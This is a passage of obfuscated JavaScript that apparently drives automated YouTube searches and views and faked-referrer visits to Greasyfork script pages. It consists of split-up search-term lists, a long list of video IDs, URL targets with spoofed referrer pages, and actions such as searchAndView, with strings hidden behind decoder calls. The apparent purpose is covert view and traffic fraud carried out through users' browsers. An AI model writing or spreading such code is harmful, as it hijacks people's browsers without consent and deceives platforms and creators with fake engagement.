searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + Y(0x11, '9#)e') + 'minecraft\x20' + Y(0x1b, 'YNuR') + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + Z(0x19) + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + a0(0xd) + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x1c12 + -0x1 * -0xb57 + -0x275f)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x384 * -0x5 + -0x46 * 0xe + -0x36 * 0x41)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x2 * -0xac4 + 0x270d + -0x3c92 * 0x1);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    a0(0x18) + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    Y(0x10, 'MS5U') + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    Y(0x0, ')GL7') + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    Z(0x2) + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + Y(0x6, 'Cr8s') + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': a0(0x4) + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + Z(0x7) + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + Z(0x9),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + Z(0x1f) + 'com?page=9'
    },
    {
      'url': Y(0x1a, '&T4a') + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': Z(0x1e) + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
